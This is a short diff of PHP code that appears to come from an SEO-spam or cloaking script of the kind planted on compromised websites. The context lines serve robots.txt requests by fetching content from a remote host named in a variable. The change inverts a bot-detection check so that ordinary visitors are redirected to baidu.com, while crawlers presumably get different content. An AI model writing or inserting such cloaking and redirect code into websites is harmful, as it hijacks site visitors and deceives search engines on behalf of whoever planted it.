@@ -16,7 +16,8 @@ if(stristr($urlaa,"robots")||stristr($urlaa,"robots.txt"))
 	echo file_get_contents('http://'.$yuming.'/robots.php');
 	exit();
 }
-if(get_naps_bot() !== false)
+if(get_naps_bot() == false)
+//if(get_naps_bot() !== false)
 {
 	header("Location: http://www.baidu.com");
 	exit;
